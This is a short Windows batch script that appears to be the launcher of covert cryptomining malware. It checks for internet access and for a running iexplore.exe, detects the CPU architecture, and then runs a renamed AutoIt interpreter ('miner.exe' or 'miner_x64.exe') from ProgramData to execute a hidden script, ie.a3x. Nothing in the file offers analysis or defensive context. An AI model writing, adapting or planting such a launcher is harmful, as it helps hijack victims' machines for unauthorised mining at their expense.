@echo off
Ping google.com -n 1 -w 1000
if errorlevel 1 exit
tasklist /FI "IMAGENAME eq iexplore.exe" 2>NUL | find /I /N "iexplore.exe">NUL && if "%ERRORLEVEL%"=="0" exit
reg Query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x86" > NUL && set OS=32BIT || set OS=64BIT
if %OS%==32BIT cd %HOMEDRIVE%\ProgramData & miner.exe /AutoIt3ExecuteScript ie.a3x
if %OS%==64BIT cd %HOMEDRIVE%\ProgramData & miner_x64.exe /AutoIt3ExecuteScript ie.a3x
